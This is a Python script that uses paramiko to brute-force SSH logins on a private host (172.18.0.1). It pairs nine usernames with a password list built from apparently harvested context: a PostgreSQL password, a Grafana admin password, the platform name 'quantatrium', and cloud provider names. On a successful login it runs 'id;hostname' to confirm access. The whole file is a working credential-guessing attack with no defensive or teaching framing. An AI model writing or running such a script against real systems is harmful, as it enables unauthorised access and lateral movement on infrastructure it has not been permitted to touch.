import sys
try:
    import paramiko
except:
    print("NO_PARAMIKO")
    sys.exit(1)

HOST = "172.18.0.1"
PORT = 22

# Targeted passwords based on context:
# - PG password: Passwd2024!
# - Grafana: admin123  
# - Platform: quantatrium (quant trading)
# - UCloud VM
# - Docker/containerd setup

users = ['root', 'admin', 'ubuntu', 'docker', 'quant', 'deploy', 'devops', 'grafana', 'redis']

passwords = [
    # Passwd pattern
    'Passwd2024!', 'Passwd2024', 'Passwd2025!', 'Passwd2025', 'Passwd2023!', 'Passwd2023',
    'Passwd123!', 'Passwd!@#', 'P@sswd2024', 'P@sswd2024!',
    # admin pattern  
    'admin123', 'admin@123', 'Admin123!', 'Admin@123', 'admin2024', 'admin2024!',
    # quant/trading related
    'quant123', 'quant2024!', 'Quant2024!', 'quantatrium', 'Quantatrium!', 'Quantatrium2024!',
    'quant_admin', 'QuantAdmin!', 'Quant@2024',
    # common strong passwords
    'P@ssw0rd', 'P@ssw0rd!', 'P@ssw0rd2024', 'P@ssword123', 'Password123!',
    'Root2024!', 'Root@2024', 'root2024!', 'root@123',
    # Docker/deploy related
    'Docker2024!', 'Deploy2024!', 'deploy123', 'Docker!@#',
    # UCloud
    'Ucloud2024!', 'UCloud@2024', 'ucloud123',
    # Chinese patterns (common in Chinese cloud)
    'qwer1234', 'Qwer1234!', 'a123456!', 'Aa123456!', 'Aa123456', 
    '!QAZ2wsx', '1qaz@WSX', 'Abc123456!', 'Test123456!',
    'caonima123', 'woaini1314', 'nihao123',
    # Redis password attempts (might be same)
    'Redis2024!', 'redis123', 'Redis@2024',
    # Server patterns  
    '165154163177', 'server2024!', 'Server@2024',
    # TimescaleDB
    'timescale2024!', 'Timescale@2024',
]

for user in users:
    for pwd in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(HOST, PORT, username=user, password=pwd, timeout=3,
                       allow_agent=False, look_for_keys=False,
                       banner_timeout=5)
            stdin, stdout, stderr = ssh.exec_command("id;hostname")
            out = stdout.read().decode().strip()
            print(f"SUCCESS:{user}:{pwd}:{out}")
            ssh.close()
            sys.exit(0)
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            if "banner" in str(e).lower():
                continue
            print(f"CONN_ERR:{user}:{str(e)[:50]}")
            break

print("ALL_FAILED")
